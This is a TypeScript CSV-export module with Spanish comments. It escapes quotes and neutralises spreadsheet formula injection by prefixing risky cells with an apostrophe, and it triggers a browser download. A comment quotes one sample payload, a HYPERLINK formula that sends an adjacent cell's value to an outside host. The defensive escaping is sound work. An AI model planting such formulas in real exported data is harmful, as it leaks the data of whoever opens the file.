/**
 * Exportación a CSV.
 *
 * Escapa dos cosas, no una. Las comillas y los separadores rompen la columna,
 * y además Excel evalúa como fórmula toda celda que empiece por = + - @ o un
 * tabulador, incluso entrecomillada. Como los datos de una tabla los escribe
 * cualquiera, alguien podría meter
 *   =HYPERLINK("https://sitio-suyo/?x="&C2,"Abrir")
 * y al abrir el archivo, quien lo revise filtraría el dato de la fila
 * contigua con un solo clic. El apóstrofo delante hace que Excel lo trate
 * como texto.
 */
export function celdaCsv(valor: unknown): string {
  const texto = valor === null || valor === undefined ? '' : String(valor)
  const seguro = /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto
  return `"${seguro.replace(/"/g, '""')}"`
}

export function descargarCsv<T extends Record<string, unknown>>(
  nombreArchivo: string,
  columnas: { clave: keyof T; titulo: string }[],
  filas: T[],
): void {
  const encabezado = columnas.map((c) => celdaCsv(c.titulo)).join(',')
  const cuerpo = filas.map((f) => columnas.map((c) => celdaCsv(f[c.clave])).join(','))
  // El BOM es lo que hace que Excel abra los acentos bien.
  const contenido = '﻿' + [encabezado, ...cuerpo].join('\r\n')

  const blob = new Blob([contenido], { type: 'text/csv;charset=utf-8;' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = `${nombreArchivo}.csv`
  document.body.appendChild(a)
  a.click()
  document.body.removeChild(a)
  // Revocar en el mismo tick cancela la descarga en Safari sin dar error.
  setTimeout(() => URL.revokeObjectURL(url), 1000)
}
